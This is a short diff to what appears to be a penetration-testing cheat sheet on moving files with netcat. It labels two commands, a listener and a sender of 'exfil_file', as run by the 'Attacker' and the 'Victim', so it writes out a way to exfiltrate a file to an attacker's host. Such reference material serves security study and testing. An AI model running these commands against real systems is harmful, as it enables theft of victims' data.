@@ -1,9 +1,8 @@
-
 ##### Netcat
 After sending a static copy to host:
 ```
-nc -lvnp 6666 > new_file
-nc -vn IP 6666 < exfil_file
+nc -lvnp 6666 > new_file                           // Attacker
+nc -vn IP 6666 < exfil_file                        // Victim
 ```
 
 ##### Socat
